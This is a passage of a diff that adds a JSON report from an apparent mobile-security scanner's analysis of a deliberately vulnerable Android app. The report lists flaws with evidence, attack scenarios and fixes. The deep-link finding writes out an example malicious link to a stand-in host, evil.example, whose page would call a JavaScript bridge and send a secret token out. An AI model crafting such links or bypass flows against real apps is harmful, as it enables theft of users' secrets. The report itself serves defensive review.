+          "link": "https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-1/"
+        }
+      },
+      "also_detected_by": [
+        {
+          "rule": "universal_logic_flaw",
+          "vulnerability": "Conceptual Logic Flaw Detection",
+          "severity": "High",
+          "description": "The exported activity trusts a caller-supplied nested Intent and launches it without validating the caller, destination component, action, data, flags, or extras. This creates an Intent redirection flaw: an untrusted application can use the vulnerable app as a proxy to invoke another activity under the vulnerable app's identity and potentially reach non-exported or permission-protected functionality. This violates OWASP MASVS platform-interaction principles requiring secure IPC boundaries and validation of untrusted inter-process input."
+        }
+      ]
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/CryptoActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Vulnerable",
+      "result": {
+        "is_vulnerable": true,
+        "severity": "High",
+        "confidence": "High",
+        "evidence": "biometricLibraryCall();\ntextView.setText(\"Biometric Auth Success! (Or Bypassed)\");\n\nprivate final boolean biometricLibraryCall() {\n    return false;\n}",
+        "description": "The biometric authentication result is ignored. performBiometricAuth() unconditionally enters the success path and reports authentication success even though biometricLibraryCall() returns false. This is a concrete authentication control-flow bypass contrary to OWASP MASVS-AUTH requirements that sensitive operations occur only after successful, securely verified authentication. The same class also promotes the client-controlled isVip flag after one denied attempt, but the shown VIP branch only changes UI text, so no separate sensitive-action impact is established.",
+        "attack_scenario": "An attacker explicitly launches the exported CryptoActivity and activates the biometric action. The biometric check returns false, but the application ignores that result and executes the success path anyway. Any sensitive operation attached to this success path would therefore be reachable without valid biometric authentication.",
+        "attacker_priority": "HIGH",
+        "recommendation": "Perform privileged actions only inside BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded, handle failure and error callbacks as denial paths, and bind sensitive cryptographic operations to a CryptoObject backed by an Android Keystore key requiring user authentication. Do not represent authentication as successful based merely on initiating a biometric call. Enforce authorization independently on a trusted backend for server-side resources, and set the activity to exported=false unless external launch is required.",
+        "false_positive_analysis": "The bypass itself is explicit: a false authentication result is discarded and success is unconditionally displayed. The manifest confirms that the activity is exported and can be explicitly targeted. However, the snippet only demonstrates a false success state in the UI and does not show a protected resource or privileged operation being released, so the concrete downstream impact depends on omitted application context."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/WebViewActivity.java",
+      "rule": "deeplink_logic_bypass",
+      "vulnerability": "Deep Link Logic Bypass",
+      "status": "Vulnerable",
+      "result": {
+        "is_vulnerable": true,
+        "severity": "High",
+        "confidence": "High",
+        "evidence": "String deepLinkUrl = data.getQueryParameter(\"url\");\nif (deepLinkUrl != null) {\n    webView.loadUrl(deepLinkUrl);\n}",
+        "description": "The exported, BROWSABLE activity extracts the attacker-controlled \"url\" query parameter from a deep link and passes it directly to WebView.loadUrl without validating the URI scheme, host, origin, or authorization state. JavaScript is enabled and the WebView exposes AndroidBridge.getSecrets(), so attacker-controlled web content can invoke the bridge and retrieve the hard-coded secret. This violates MASVS-PLATFORM-1 because externally supplied deep-link data is used in a security-sensitive IPC flow without validation.",
+        "attack_scenario": "An attacker sends the victim a deep link such as dlh://webview?url=https%3A%2F%2Fevil.example%2Fsteal.html. Because WebViewActivity is exported and BROWSABLE, Android opens it and loads the attacker's page. JavaScript on that page calls AndroidBridge.getSecrets() and transmits SUPER_SECRET_TOKEN_FROM_BRIDGE to the attacker. Non-HTTP schemes may also reach loadUrl because no scheme allowlist is enforced.",
+        "attacker_priority": "HIGH",
+        "recommendation": "Do not load arbitrary deep-link parameters in a privileged WebView. Parse the parameter with Uri.parse, require an explicit HTTPS scheme, compare the normalized host against an exact allowlist, reject user-info, unexpected ports, malformed URLs, redirects to untrusted origins, and non-network schemes, and verify the user's authorization state before processing sensitive links. Remove setAllowUniversalAccessFromFileURLs(true), disable unnecessary file access, and do not expose secrets through addJavascriptInterface. If a JavaScript bridge is unavoidable, only attach it for trusted local or allowlisted content and remove it before loading any untrusted origin.",
+        "false_positive_analysis": "The source-to-sink flow and external reachability are explicit: the manifest marks WebViewActivity exported with a BROWSABLE dlh://webview intent filter, and the unvalidated \"url\" parameter reaches WebView.loadUrl. This would only be mitigated by security controls not shown here, such as an intercepting WebViewClient that blocks all untrusted navigations or platform/network restrictions preventing the malicious content from loading; the instantiated plain WebViewClient provides no such validation.",
+        "masvs_reference": {
+          "id": "MASVS-PLATFORM-1",
+          "description": "The app uses IPC mechanisms securely. Ensure deep links properly verify authorization state to prevent logic bypass.",
+          "link": "https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-1/"
+        }
+      },
+      "also_detected_by": [
+        {
+          "rule": "universal_logic_flaw",
+          "vulnerability": "Conceptual Logic Flaw Detection",
+          "severity": "High",
+          "description": "The exported, BROWSABLE activity trusts an attacker-controlled deep-link parameter and loads it into a JavaScript-enabled WebView without validating the scheme, origin, or caller. The same WebView exposes AndroidBridge.getSecrets(), creating a complete IPC trust flaw: an external caller controls the web content that receives access to a sensitive native bridge. This violates OWASP MASVS requirements to validate untrusted IPC input and enforce trust boundaries around sensitive platform interactions."
+        }
+      ]
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/ZipSlipActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Vulnerable",
+      "result": {
+        "is_vulnerable": true,
+        "severity": "Medium",
+        "confidence": "High",
+        "evidence": "String zipPath = getIntent().getStringExtra(\"zip_path\");\nString names = unzip(new File(zipPath), targetDir);",
+        "description": "The exported activity trusts an unvalidated Intent extra to select an archive and immediately performs file extraction under the application's identity. It does not verify the caller, require a signature permission, or restrict the supplied file to an approved location. This creates an IPC confused-deputy flaw contrary to OWASP MASVS platform-interaction principles: another application can explicitly invoke the component and trigger app-privileged file processing.",
+        "attack_scenario": "A malicious application places a crafted archive at a location readable by the target application, explicitly launches com.dlh.vulnerapp.ZipSlipActivity, and supplies that archive's path in the zip_path extra. The target application then opens and extracts attacker-selected content under its own UID without authorizing the caller. Any separate unsafe archive-entry path handling would further increase impact, but is outside this conceptual-logic finding.",
+        "attacker_priority": "MEDIUM",
+        "recommendation": "Set the activity to android:exported=\"false\" if external invocation is unnecessary. Otherwise protect it with a signature-level permission, verify the calling UID/package where reliable, and accept only application-selected files through a controlled URI flow with explicit grants. Canonicalize and allowlist the input location before processing, enforce archive size and entry limits, and independently validate every extraction destination.",
+        "false_positive_analysis": "The component is authoritatively exported, so external reachability is established despite having no intent filter because an attacker can use an explicit Intent. Practical impact may be reduced if Android filesystem permissions prevent an attacker from supplying any path readable by the target, or if omitted framework/application controls authenticate callers before onCreate executes. The archive entry path issue visible in unzip is path traversal and is not itself the basis of this conceptual trust finding."
+      }
+    },
+    {
+      "file": "output/VulnerAppDLHv2.apk_decompiled/sources/com/dlh/vulnerapp/SecretsActivity.java",
+      "rule": "universal_logic_flaw",
+      "vulnerability": "Conceptual Logic Flaw Detection",
+      "status": "Vulnerable",
+      "result": {
+        "is_vulnerable": true,
+        "severity": "High",
+        "confidence": "High",
+        "evidence": "if (!(user.length() == 0)) {\n    if (!(pass.length() == 0)) {\n        ...\n        $statusText.setText(\"Logged in & Saved! \\n(Check /data/data/.../shared_prefs/UserPrefs.xml)\");\n        Toast.makeText(this$0, \"Secret Key Used: \" + this$0.AWS_SECRET_KEY, 1).show();",
+        "description": "The application treats any non-empty username and password as successful authentication. No credential verification, authenticated server response, session validation, or other trusted security decision occurs before the application enters the logged-in flow and uses/discloses privileged data. This is a client-side authentication control-flow bypass and violates OWASP MASVS authentication and authorization principles requiring security decisions to be enforced by a trusted backend.",
+        "attack_scenario": "An attacker explicitly launches the exported SecretsActivity, enters arbitrary non-empty values such as \"a\" and \"b\", and presses the login button. The application declares the attacker logged in, executes the post-authentication flow, saves privileged data, and displays the secret-key value without verifying the supplied credentials.",
+        "attacker_priority": "HIGH",
+        "recommendation": "Authenticate credentials through a trusted backend over a secure channel and enter the privileged flow only after validating a server-issued, short-lived session or token. Enforce authorization for every sensitive server operation on the backend rather than relying on an Activity or client-side flag. Do not expose long-lived cloud credentials to the Android client, and make SecretsActivity non-exported unless external invocation is explicitly required.",
+        "false_positive_analysis": "The authentication bypass is explicit in the shown control flow: non-emptiness is the only condition before the success path. Impact could be lower if this is intentionally a demonstration screen and the displayed example credentials are inert, or if no real privileged capability depends on this state. However, those possibilities do not remove the concrete local authentication logic flaw."
+      }
+    }
+  ],
+  "analysis_errors": []
+}
